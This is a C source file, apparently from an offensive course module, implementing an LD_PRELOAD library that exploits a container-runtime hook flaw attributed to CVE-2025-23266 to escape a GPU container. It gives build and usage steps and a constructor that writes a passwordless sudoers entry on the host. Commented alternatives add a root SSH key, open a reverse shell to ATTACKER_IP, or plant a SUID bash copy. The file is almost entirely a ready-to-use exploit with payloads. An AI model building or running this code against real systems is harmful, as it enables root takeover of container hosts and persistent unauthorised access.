/*
 * Script: gpu_escape_cve_2025_23266.c
 * Module: 09 — AI Infrastructure and Deployment Exploits
 * Purpose: LD_PRELOAD shared library for GPU container escape via CVE-2025-23266
 * Usage:
 *   gcc -shared -fPIC -nostartfiles -o cuda_compat_shim.so gpu_escape_cve_2025_23266.c
 *   # Then build container image with LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
 *   # Run via privileged build/run tool — OCI hook inherits LD_PRELOAD from container env
 * Target: runc-based container runtime with vulnerable OCI hook handling
 *
 * How it works:
 *   CVE-2025-23266: runc propagates LD_PRELOAD from container image env into OCI lifecycle
 *   hook processes. Hooks run ON THE HOST with elevated privileges. The .so is loaded
 *   before the hook binary executes. __attribute__((constructor)) fires at load time.
 *   /proc/self/cwd from the hook's perspective resolves to the CONTAINER'S ROOT on the
 *   host filesystem — so LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so finds the .so
 *   placed at / inside the container image.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

/* Constructor fires automatically when this .so is loaded — no explicit call needed */
__attribute__((constructor))
static void init(void) {
    /* Immediately unset LD_PRELOAD to avoid propagating into child processes */
    unsetenv("LD_PRELOAD");

    /*
     * Write sudoers entry for the target user.
     * /etc/sudoers.d/ is writable because this code runs in host context
     * with runc's elevated hook privileges.
     * Change "robertj" to the username of the low-priv shell you have.
     */
    FILE *f = fopen("/etc/sudoers.d/cuda-compat-update", "w");
    if (f) {
        fprintf(f, "robertj ALL=(ALL) NOPASSWD: ALL\n");
        fclose(f);
        /* sudoers.d files must be mode 0440 or sudo ignores them */
        chmod("/etc/sudoers.d/cuda-compat-update", 0440);
    }

    /*
     * Alternative payloads (comment out sudoers and use one of these):
     *
     * Add SSH key to root:
     *   system("mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys");
     *
     * Reverse shell:
     *   system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &");
     *
     * Create SUID bash copy:
     *   system("cp /bin/bash /tmp/.bash && chmod 4755 /tmp/.bash");
     *   // Then: /tmp/.bash -p  → root shell
     */
}
